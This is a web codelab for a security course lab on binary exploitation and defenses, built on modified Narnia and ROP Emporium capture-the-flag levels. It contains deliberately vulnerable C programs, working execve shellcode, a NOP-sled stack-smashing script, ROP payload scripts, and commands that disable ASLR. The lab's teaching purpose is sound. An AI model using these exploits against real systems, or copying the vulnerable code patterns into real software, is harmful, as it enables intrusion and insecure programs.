
<!doctype html>
<html>
<head>
<meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1,user-scalable=yes">
<meta name="theme-color" content="#4F7DC9">
<meta charset="UTF-8">
<title>7.1: Binary exploitation and defense</title>
<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Source+Code+Pro:400|Roboto:400,300,400italic,500,700|Roboto+Mono">
<link rel="stylesheet" href="//fonts.googleapis.com/icon?family=Material+Icons">
<link rel="stylesheet" href="https://storage.googleapis.com/claat-public/codelab-elements.css">
<style>
.success{color:#1e8e3e}.error{color:red} </style>
</head>
<body>
<google-codelab-analytics gaid="UA-49880327-14"></google-codelab-analytics>
<google-codelab codelab-gaid="" id="S7.1_BinaryExploit" title="7.1: Binary exploitation and defense" environment="web" feedback-link="https://docs.google.com/document/d/1Kw2VcAln-2uQ7F6SF_QjFOreO77y2FOggUSOxfb7QgU">
<google-codelab-step label="Introduction" duration="2">
<p>With the prevalence of compiled C code in all of the computing systems we operate, it is imperative that one of C&#39;s biggest issues, memory corruption vulnerabilities, is addressed properly. There are a multitude of attack vectors for corrupting memory in C programs and a multitude of defenses. </p>
<p>In this lab, you will be working with some of the simpler ones using modifications to initial programs in several popular binary exploitation CTFs: <a href="https://overthewire.org/wargames/narnia/" target="_blank">Overthewire.org&#39;s Narnia</a> and <a href="https://ropemporium.com/" target="_blank">ROP Emporium</a>.</p>
<p>To begin with, bring up the Kali VM. </p>
</google-codelab-step>
<google-codelab-step label="narnia0: Corrupting variables" duration="10">
<p>The simplest memory corruption vector is a buffer overflow. Below is a slightly modified version of the initial level of Narnia: <code>narnia0.c</code>. It contains a long integer (<code>val</code>) and a 20-byte buffer (<code>buf</code>) that are local variables stored on the stack. The goal of the level is to overflow <code>buf</code> and corrupt <code>val</code> to contain a specific value <code>0xdeadbeef</code>. When this happens, the program invokes a shell (<code>/bin/sh</code>). When played on overthewire.org, the program runs with the <code>setuid</code> bit set to allow it to become the <code>narnia1</code> user, giving you access to the <code>narnia1</code> password. As the source code shows, the program has a buffer overflow vulnerability in that the <code>scanf</code> attempts to read 24 bytes into a 20 byte buffer, allowing one to overflow it. On your Kali VM, create the file.</p>
<h3 is-upgraded>narnia0.c</h3>
<pre><code>#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main(){
  long val=0x41414141;
  char buf[20];
  printf(&#34;Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!\n&#34;);
  printf(&#34;Here is your chance: &#34;);
  scanf(&#34;%24s&#34;,&amp;buf);
  printf(&#34;buf: %s\n&#34;,buf);
  printf(&#34;val: 0x%08x\n&#34;,val);
  if(val==0xdeadbeef)
    system(&#34;/bin/sh&#34;);
  else { 
    printf(&#34;WAY OFF!!!!\n&#34;);
    exit(1);
  }
 return 0;
}</code></pre>
<p>Then, compile the file using 32-bit x86. Note that we choose 32-bit x86 due to its simplicity and that our Kali VM has the appropriate 32-bit libraries installed. The attacks work similarly on other architectures.</p>
<pre>gcc -m32 -o narnia0 narnia0.c</pre>
</google-codelab-step>
<google-codelab-step label="- Probing memory layout" duration="10">
<p>Execute the program binary after compilation.</p>
<pre><code>./narnia0</code></pre>
<p>When prompted, enter a single character. The program prints out the character and shows <code>val</code> is unchanged.</p>
<p>Next, execute the program again and enter in the following string as input.</p>
<pre><code>ABCDEFGHIJKLMNOPQRSTUVWXYZ</code></pre>
<ul>
<li><strong>What has </strong><strong><code>val</code></strong><strong> been changed to? Which 4 </strong><a href="https://www.asciitable.com/" target="_blank"><strong>ASCII</strong></a><strong> letters from the input does this represent?</strong></li>
</ul>
<p>We need to change those 4 letters so that it can read <code>0xdeadbeef</code>, but we have an issue. We enter input from the keyboard using 7-bit ASCII, but all of the bytes in the pattern we wish to input have the most-significant bit set. One way to send binary input to a program is to use <code>echo -e</code>, which allows us to specify raw bytes via <code>\x</code> that we can then pipe into our program. For example, the snippet below will emit 4 raw bytes (<code>aa</code>, <code>bb</code>, <code>cc</code>, <code>dd</code>) that can then be sent via a pipe to standard input of <code>narnia0</code>.</p>
<pre>echo -e &#34;\xaa\xbb\xcc\xdd&#34;</pre>
<p>Sending raw bytes by piping the output of the <code>echo</code> to <code>narnia0</code> solves one issue, but creates another. Once the <code>echo</code> completes, it tears down the pipe, causing the standard input of the program at the end of the pipe to receive an <code>EOF</code>. As the successful exploit invokes an interactive shell, this <code>EOF</code> terminates the shell immediately. To send the input while keeping the pipe open, we can simply run a <code>cat</code> command with no arguments to tie the standard input and output back to our terminal.</p>
<p>Using this, fill in the command below with the appropriate values to obtain an interactive <code>/bin/sh</code> session via the <code>narnia0</code> binary. Note that endianness requires you to arrange the bytes of <code>0xdeadbeef</code> in the input in a particular order.</p>
<pre>(echo -e &#34;ABCD...&#34;; cat ) | ./narnia0</pre>
<ul>
<li><strong>Perform an </strong><strong><code>ls</code></strong><strong>, then take a screenshot of the successful execution.</strong></li>
</ul>
</google-codelab-step>
<google-codelab-step label="narnia1: Shellcode and DEP" duration="5">
<p>In the previous level, we corrupted memory to execute code to invoke a shell that was already in the program itself. The idea of shellcode is to inject binary code into the victim process and force the program to execute it. There are an immense number of snippets for doing so across any CPU architecture you may find via Shell Storm (<a href="https://shell-storm.org/shellcode/" target="_blank">https://shell-storm.org/shellcode/</a>). </p>
<p>To begin with, create the file below on your Kali VM that has been derived from the <code>narnia1</code> level. As the code shows, it pauses to get a single character of input from the terminal, before pulling data from the environment variable <code>EGG</code> into a buffer and then executing it. Note that environment variables are placed onto the stack within a process&#39;s memory space by the system loader upon invocation. </p>
<h3 is-upgraded>narnia1.c</h3>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;

int main(){
    int (*ret)();
    int i = getchar();

    if(getenv(&#34;EGG&#34;)==NULL){
        printf(&#34;Give me something to execute at the env-variable EGG\n&#34;);
        exit(1);
    }

    printf(&#34;Trying to execute EGG!\n&#34;);
    ret = (int (*)())getenv(&#34;EGG&#34;);
    ret();

    return 0;
}</code></pre>
<p>Execution of binary code in environment variables is not exactly safe nor likely to happen in real-life, but the exercise allows us to demonstrate working shellcode and the NoExecute (NX) defense against code injection onto the stack that operating systems now support. <code>gcc</code> enables the NX protection on the stack by default. However, it also provides the <code>-z execstack</code> flag to disable the protection. The setting is passed to the loader which applies the appropriate permissions to the stack segments in memory. Compile two versions of the level.</p>
<p>First, compile a version that allows execution from the stack.</p>
<pre><code>gcc -m32 -z execstack -o narnia1_exec narnia1.c</code></pre>
<p>Then, compile the default version that disallows execution from the stack.</p>
<pre><code>gcc -m32 -o narnia1_noexec narnia1.c</code></pre>
</google-codelab-step>
<google-codelab-step label="- Understanding shellcode" duration="2">
<p>We need to set the environment variable EGG to contain binary code that, when executed, will give us an interactive shell as in the previous level. One of the more compact examples of shellcode that does so is shown below both in binary and in disassembled form with comments.</p>
<pre> 31 c0           xor    %eax,%eax     // Put &#34;/bin/sh&#34; on stack
 50              push   %eax
 68 2f 2f 73 68  push   $0x68732f2f
 68 2f 62 69 6e  push   $0x6e69622f
 89 e3           mov    %esp,%ebx    // Point %ebx to &#34;/bin/sh&#34;
 89 c1           mov    %eax,%ecx    // Null out other regs
 89 c2           mov    %eax,%edx
 b0 0b           mov    $0xb,%al     // Syscall execve (11)
 cd 80           int    $0x80        // Call execve(&#34;/bin/sh&#34;,0,0)
 90              nop                 // Pad to multiple of 4</pre>
<p>As the code shows, the arguments for the <code>execve</code> system call are crafted onto the stack, before the call is invoked. In the Kali VM terminal, set the EGG environment variable to the shellcode.</p>
<pre>export EGG=`echo -e &#34;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x90&#34;`</pre>
</google-codelab-step>
<google-codelab-step label="- Understanding DEP" duration="5">
<p>We will now run our two compiled versions of the level to show how data execution prevention (DEP) support works. DEP implements page protections to prevent execution from certain segments of memory via its &#34;NoExecute&#34; or &#34;NX&#34; settings. To begin with, launch the version that allows execution from the stack (<code>narnia1_exec</code>) and put the process in the background. The program will pause waiting keyboard input, allowing us to examine the process&#39;s memory space via <code>/proc</code>. When placed in the background, the shell returns the PID of the backgrounded process. Perform an <code>egrep</code> of the processes memory map looking for the range of addresses mapped to the stack and their permissions.</p>
<pre>./narnia1_exec &amp;
egrep stack /proc/&lt;PID&gt;/maps</pre>
<ul>
<li><strong>What is the size of the memory allocated for the stack? What indicates the stack allows code execution?</strong></li>
</ul>
<p>Resume the process by typing <code>fg</code>, then enter a key to execute the EGG. </p>
<ul>
<li><strong>Perform an </strong><strong><code>ls</code></strong><strong>, then take a screenshot of the successful execution.</strong></li>
</ul>
<p>Next, launch the version that disallows execution from the stack (<code>narnia1_noexec</code>), repeating the same process above to examine the memory mapped range for its stack.</p>
<pre>./narnia1_noexec &amp;
egrep stack /proc/&lt;PID&gt;/maps</pre>
<ul>
<li><strong>What has changed in the output of the memory map?</strong></li>
</ul>
<p>Resume the process by typing <code>fg</code>, then enter a key to execute the EGG. Note that the EGG address is in the stack and that it executes the binary payload, giving you a shell.</p>
<ul>
<li><strong>What results from attempting to execute instructions from the stack in this case?</strong></li>
</ul>
</google-codelab-step>
<google-codelab-step label="narnia2: Stack smashing, ASLR and canaries" duration="5">
<p>There are several problems when attempting to leverage a buffer overflow vulnerability to inject and execute code. One problem is finding where in virtual memory the buffer being injected into is located. Once found, another problem is attempting to hijack the program counter (e.g. <code>%eip</code>) to point to the code. To gain an understanding of these problems, we&#39;ll use a modified version of the <code>narnia2</code> level as shown below. In it, a function <code>callme()</code> takes the string passed into the program (e.g. <code>argv1</code>) and unsafely copies it into an internal 128-byte buffer (<code>buf</code>). A classical buffer overflow attack would be to write shellcode into <code>buf</code>, then overflow <code>buf</code> and write over the return address for <code>callme()</code> with the address of the shellcode stored in <code>buf</code>. As part of the level code, the address of <code>buf</code> and of the function <code>printf</code> is printed.</p>
<h3 is-upgraded>narnia2.c</h3>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;

int callme(char * argv1) {
    char buf[128];
    printf(&#34;buf is %p\n&#34;, buf);
    strcpy(buf,argv1);
    printf(&#34;You sent: %s\n&#34;, buf);
    return 0;
}

int main(int argc, char * argv[]){
    if (argc == 2) {
        callme(argv[1]);
    }
}</code></pre>
<p>Compile the level.</p>
<pre>gcc -m32 -o narnia2 narnia2.c</pre>
</google-codelab-step>
<google-codelab-step label="- ASLR" duration="5">
<p>The need to find the address of the buffer that code is injected into motivates the use of address space layout randomization (ASLR). On Linux, ASLR is enabled by default, but it can also be configured system-wide. To view its current setting on the Kali VM, perform the following command to output the kernel&#39;s setting. It should be set to 1 (randomized stack and shared memory) or 2 (same as 1 but also randomized data)..</p>
<pre>cat /proc/sys/kernel/randomize_va_space</pre>
<p>Run the level using your <code>OdinID</code> as the argument 2 times. </p>
<pre>./narnia2 &lt;OdinID&gt;</pre>
<p>As shown in the output, the address of <code>buf</code> differs each time. Such randomization makes it difficult to guess where either is located a priori. Run the program 5 times and track the lowest and highest address that is allocated for each. Answer the questions below for your lab notebook.</p>
<ul>
<li><strong>Which bits of the location of </strong><strong><code>buf</code></strong><strong> (e.g. the stack) appear to be random?</strong></li>
</ul>
<p>An adversary would need to perform a brute-force attack to guess the appropriate address in order to be successful.</p>
<p>We can turn off randomization on the system by clearing the kernel flag. Use the command below to do so.</p>
<pre>sudo sh -c &#34;echo 0 &gt; /proc/sys/kernel/randomize_va_space&#34;</pre>
<p>Run the <code>narnia2</code> level command again using your <code>OdinID</code> multiple times.</p>
<ul>
<li><strong>Take a screenshot showing the address where </strong><strong><code>buf</code></strong><strong> is located.</strong></li>
</ul>
</google-codelab-step>
<google-codelab-step label="- Canaries" duration="10">
<p>Once the address of the buffer that code is injected into is found, the other problem is getting the program counter <code>%eip</code> to jump to it. Typically, in a buffer overflow, you overwrite the return address of a function call and then when the function returns, it will return to the address you have written into it. Stack canaries attempt to prevent this by placing a special random value onto the stack when entering the function and then checking that the value has not been modified before the return is executed. By placing this value in between a function&#39;s local variables and the return address of the function, the system can detect when buffers are overflowed. The code for implementing stack canaries is added by the compiler and is configurable via a flag. Using this flag, compile two versions of the <code>narnia2</code> code.</p>
<pre>gcc -fno-stack-protector -no-pie -m32 -o narnia2_nocanary narnia2.c
gcc -fstack-protector -no-pie -m32 -o narnia2_canary narnia2.c</pre>
<p>Then, examine the differences in the assembly code for the <code>callme()</code> function in each.</p>
<pre>objdump --disassemble=callme --no-addresses narnia2_nocanary &gt; nocanary.txt
objdump --disassemble=callme --no-addresses narnia2_canary &gt; canary.txt
diff nocanary.txt canary.txt</pre>
<ul>
<li><strong>Which instructions move the canary onto the stack?</strong></li>
<li><strong>Which instructions check that the canary hasn&#39;t been changed?</strong></li>
<li><strong>What function is called if the canary has been modified?</strong></li>
</ul>
<p>We&#39;ll now execute each version using an argument that leverages the buffer overflow. Execute the commands below. The argument for each is the output of a small Python script that outputs 144 &#39;A&#39; characters. This is enough to fill <code>buf</code> and overwrite the return address of <code>callme()</code>.</p>
<pre><code>./narnia2_canary `python3 -c &#34;print(&#39;A&#39;*144)&#34;`
./narnia2_nocanary `python3 -c &#34;print(&#39;A&#39;*144)&#34;`</code></pre>
<ul>
<li><strong>Explain the different outputs and what has happened in each case.</strong></li>
</ul>
</google-codelab-step>
<google-codelab-step label="- Defense-in-Depth" duration="1">
<p>Our tour through binary exploitation and its defenses is a good example of how defense-in-depth can be effective in preventing exploitation. To actually get code execution, the adversary must:</p>
<ul>
<li>Find a vulnerable C program</li>
<li>Find it running on a system that does not have ASLR</li>
<li>That also does not utilize DEP to protect the stack</li>
<li>That also does not have stack canaries turned on.</li>
</ul>
<p>All we need to do as defenders is ensure the counter-measures have been deployed. Unfortunately, in many situations, such as on medical IoT devices, they <a href="https://duo.com/decipher/urgent-11-flaws-now-affect-broader-range-of-medical-network-devices" target="_blank">are not</a>.</p>
<p>To exploit this vulnerable program to obtain a shell, we&#39;ll need to turn off all protections. First, compile the program without stack canaries and without data execution prevention enabled on the stack.</p>
<pre>gcc -fno-stack-protector -no-pie -z execstack -m32 -o narnia2_noprotect narnia2.c</pre>
<p>Then, ensure ASLR has been disabled.</p>
<pre>sudo sh -c &#34;echo 0 &gt; /proc/sys/kernel/randomize_va_space&#34;</pre>
</google-codelab-step>
<google-codelab-step label="- Exploitation" duration="1">
<p>We&#39;ll now exploit the program to obtain a shell. While we have disabled address space randomization, the location of the buffer we&#39;re injecting into is sensitive to the run-time arguments placed on the stack. The size of the buffer is 128 bytes so we can probe the binary with a payload large enough to fill the buffer and reach the return address. The program will then give us the address of the buffer. For programs that do not conveniently give us the buffer&#39;s address, we would need to examine things in a debugger. Run the command below twice to find the address of the buffer, ensuring that ASLR has been turned off.</p>
<ul>
<li><strong>What is the address of the buffer when given a 144 byte argument?</strong></li>
</ul>
<pre><code>./narnia2_noprotect `python3 -c &#34;print(&#39;A&#39;*144)&#34;`</code></pre>
<p>Because the arguments for the program are also stored on the stack, repeating the command using different sizes of input will shift the location of the buffer. Run the above command multiple times with different sizes to see the address of <code>buf</code> shift..</p>
<p>We can now craft our exploit payload. Exploit payloads typically contain a NOP sled, followed by shellcode, followed by the address of the buffer that will contain the payload. The NOP sled allows return addresses pointing anywhere within the sled to lead to execution of the shellcode in case our address calculations are inaccurate. Spamming the address of the buffer at the end, ensures we will likely hit the location of the return address. The address must be aligned on a 4-byte boundary. </p>
<p>Like the prior Python code, the script below outputs 144 bytes consisting of 88 NOPs (0x90 in 32-bit x86), the 24-byte shellcode from the previous level, and 8 copies of the address to return to in little-endian format. The script assumes the buffer is located at <code>0xffffd460</code> on the stack. You will need to change this to the address of the buffer you found above instead.</p>
<h3 is-upgraded>shell.py</h3>
<pre><code>import sys
shell = bytes.fromhex(
        &#39;90&#39;*88+
        &#39;31c050682f2f7368682f62696e89e389c189c2b00bcd8090&#39;+
        &#39;60d4ffff&#39;*8
        )
sys.stdout.buffer.write(shell)</code></pre>
<p>Run the exploit.</p>
<pre><code>./narnia2_noprotect `python3 shell.py`</code></pre>
<ul>
<li><strong>Perform an </strong><strong><code>ls</code></strong><strong>, then take a screenshot of the successful execution.</strong></li>
</ul>
</google-codelab-step>
<google-codelab-step label="ret2win: Return-oriented Programming" duration="5">
<p>As a result of DEP, exploits that inject code onto the stack and attempt to execute it are no longer possible. However, it is still possible to hijack the execution of a program. With Return-oriented Programming (ROP), the instructions to execute are already resident in the program and the adversary simply selects a sequence of them to run. By tricking the program into executing code and functions that are not part of intended behavior, the adversary can perform the exploitation. Note that the technique is referred to as &#34;Return-to-Libc&#34; when using instructions resident in the standard C library. In terms of counter-measures against this attack, stack canaries and ASLR make ROP more difficult to perform.</p>
<p>The <a href="https://ropemporium.com/" target="_blank">ROP Emporium</a> set of challenges provides a scaffolded set of binaries that we can use to learn the basics of the ROP technique. The initial level is <code>ret2win</code>. On the Kali VM, begin by downloading the 32-bit x86 level binary, unpacking it, and executing the level binary to read the instructions.</p>
<pre><code>wget https://ropemporium.com/binary/ret2win32.zip
unzip ret2win32.zip
./ret2win32</code></pre>
<p>The goal of each challenge is to get the program to read the <code>flag.txt</code> file and print it. For this level, the program has a 32 byte buffer but reads up to 56 bytes into it, causing a buffer overflow on the stack. </p>
</google-codelab-step>
<google-codelab-step label="- Examining the binary" duration="5">
<p>Because we are not given the source code for these levels, we&#39;ll need to use binary analysis tools to understand how to exploit it. Start by using the <code>nm</code> utility to list the symbols in the <code>ret2win32</code> binary, then using <code>egrep</code> to filter out those that are functions.</p>
<pre>nm ret2win32| egrep &#34; [Tt] &#34;</pre>
<p>There are 2 functions of particular interest: <code>pwnme()</code> and <code>ret2win()</code>. Use <code>objdump</code> to disassemble <code>pwnme()</code>.</p>
<pre>objdump --disassemble=pwnme ret2win32</pre>
<p>The disassembly shows that the function does a <code>memset</code> to 0 of a 32-byte (0x20) area of memory, outputs a variety of strings using <code>puts()</code>, does a read of up to 56 bytes (0x38) into the memory area, then outputs a final string using <code>puts()</code>.</p>
<ul>
<li><strong>List the 4 different addresses pushed as parameters onto the stack for each call to </strong><strong><code>puts()</code></strong></li>
</ul>
<p>The arguments are addresses to static strings stored in the program&#39;s read-only memory section. Use <code>objdump</code> again to find the strings and their corresponding locations.</p>
<pre>objdump -s ret2win32 -j .rodata</pre>
<p>As the analysis shows, the function implements the main function of the level, but does not have the ability to emit <code>flag.txt</code>. Figuring this out with <code>objdump</code> is a multi-step process. Modern disassemblers can automatically cross-reference embedded strings to allow one to perform the analysis with one step. <code>radare2</code> is one popular alternative for Linux. Use the following command to have <code>radare2</code> perform the disassembly of <code>pwnme()</code> and its embedded arguments.</p>
<pre>radare2 -A -q -c pdf@sym.pwnme ret2win32</pre>
<p>Scroll through the output.</p>
<ul>
<li><strong>Take a screenshot of the last </strong><strong><code>puts()</code></strong><strong> in </strong><strong><code>pwnme()</code></strong><strong> as disassembled by </strong><strong><code>radare2</code></strong><strong> showing its cross-referenced string</strong></li>
</ul>
<p>Finally, examine the <code>ret2win</code> function in <code>radare2</code>.</p>
<pre>radare2 -A -q -c pdf@sym.ret2win ret2win32</pre>
<ul>
<li><strong>Take a screenshot of the 2 assembly instructions that will emit </strong><strong><code>flag.txt</code></strong><strong> if executed.</strong></li>
</ul>
<p>Make a note of the address of the first one. We will look to have the program return to its location when the buffer is overflowed.</p>
</google-codelab-step>
<google-codelab-step label="- Exploitation" duration="5">
<p>The goal of the level is for you to overflow the buffer in <code>pwnme()</code> and have execution return to the instructions that emit <code>flag.txt</code>. We could either return to <code>ret2win()</code> or to the instructions we made a note of in the previous step. Using the strategy previously deployed for <code>narnia2</code>, we can spam the address we wish to return to into the buffer knowing that one of them will hit the location of the return address for <code>pwnme()</code> on the stack, thus causing it to return to the code to emit the flag rather than the original caller.</p>
<p>Create a Python program to output the address from the earlier step repeatedly in order to fill up 56 bytes. For a 32-bit address, this would be 14 copies of the address. Note that the address must be in little-endian format.</p>
<h3 is-upgraded>ret2win.py</h3>
<pre><code>import sys
rop = bytes.fromhex(&#39;xxyy0408&#39;*14)
sys.stdout.buffer.write(rop)</code></pre>
<p>Then, run the script and pipe its output to the level binary.</p>
<pre><code>python3 ret2win.py | ./ret2win32</code></pre>
<ul>
<li><strong>Take a screenshot showing successful exploitation of the binary</strong></li>
</ul>
</google-codelab-step>
<google-codelab-step label="split: Invoking functions with parameters" duration="5">
<p>In the previous level, we were conveniently given instructions that pushed the command we wanted to execute onto the stack (<code>"/bin/cat flag.txt"</code>) and then called <code>system()</code> to invoke it. In this level, while there is a call to <code>system()</code> in the program, the parameter passed to it will not emit the flag.</p>
<p>Begin by downloading the 32-bit x86 level binary, unpacking it, and executing the level binary to read the instructions.</p>
<pre><code>wget https://ropemporium.com/binary/split32.zip
unzip split32.zip
./split32</code></pre>
</google-codelab-step>
<google-codelab-step label="- Examining the binary" duration="5">
<p>The level is set-up similarly to <code>ret2win</code> with the <code>pwnme()</code> function doing a 96-byte read on a 32-byte buffer as shown via its disassembly:</p>
<pre>radare2 -A -q -c pdf@sym.pwnme split32</pre>
<p>A function helpfully named as <code>usefulFunction</code> is also provided. Disassemble and examine it as well.</p>
<pre>radare2 -A -q -c pdf@sym.usefulFunction split32</pre>
<ul>
<li><strong>What Linux command is executed if we overflow the buffer in </strong><strong><code>pwnme()</code></strong><strong> to return to this function?</strong></li>
<li><strong>What is the address of the command string?</strong></li>
<li><strong>What is the address of the instruction that issues the </strong><strong><code>call</code></strong><strong> to system()</strong></li>
<li><strong>What would happen if we return to the </strong><strong><code>call</code></strong><strong> to </strong><strong><code>system()</code></strong><strong> instead of the call that pushes the string address?</strong></li>
</ul>
<p>As a result of controlling the stack, an adversary can prepare an arbitrary argument list onto the stack just before injecting the return address pointing to a <code>call</code> instruction.</p>
<p>Using <code>objdump</code>, search the binary for interesting strings located in its data sections.</p>
<pre>objdump -s split32 -j .data -j .rodata</pre>
<p>You can also do so by using <code>radare2</code>.</p>
<pre>radare2 -A -q -c iz split32</pre>
<p>As the output shows, the string we wish to call <code>system()</code> with to emit <code>flag.txt</code> is conveniently stored in program memory. All we need to do is put its address onto the stack as a &#34;parameter&#34; and directly return to the call instruction used to invoke <code>system()</code>.</p>
</google-codelab-step>
<google-codelab-step label="- Exploitation" duration="5">
<p>We now have the two addresses we need: the address of an instruction that invokes a call to <code>system()</code> and the address of the string we want to send as a parameter to the call. If we can get the stack to the state below when returning from <code>pwnme()</code>, we will successfully exploit the level.</p>
<p class="image-container"><img style="width:457px" src="img/2349638feb1c61eb.png"></p>
<p>We will again create a Python program to output these addresses as pairs repeatedly in order to fill up the 96 bytes. For 32-bit addresses, this would be 12 pairs of addresses in little-endian format.</p>
<h3 is-upgraded>split.py</h3>
<pre><code>import sys
rop = bytes.fromhex(&#39;xxxx0408yyyy0408&#39;*12)
sys.stdout.buffer.write(rop)</code></pre>
<p>Then, run the script and pipe its output to the level binary.</p>
<pre><code>python3 split.py | ./split32</code></pre>
<ul>
<li><strong>Take a screenshot showing successful exploitation of the binary</strong></li>
</ul>
<p>This completes our brief introduction to binary exploitation via memory corruption. There are many other defenses and counter-measures against defenses to explore as well as other data structures besides the stack to attack. Visit the CTFs below if you find this topic interesting and want to learn more:</p>
<ul>
<li><a href="https://overthewire.org/wargames/" target="_blank">https://overthewire.org/wargames/</a></li>
<li><a href="https://ropemporium.com/" target="_blank">https://ropemporium.com/</a> </li>
<li><a href="https://microcorruption.com/" target="_blank">https://microcorruption.com/</a> </li>
</ul>
</google-codelab-step>
</google-codelab>
<script src="https://storage.googleapis.com/claat-public/native-shim.js"></script>
<script src="https://storage.googleapis.com/claat-public/custom-elements.min.js"></script>
<script src="https://storage.googleapis.com/claat-public/prettify.js"></script>
<script src="https://storage.googleapis.com/claat-public/codelab-elements.js"></script>
<script src="//support.google.com/inapp/api.js"></script>
</body>
</html>
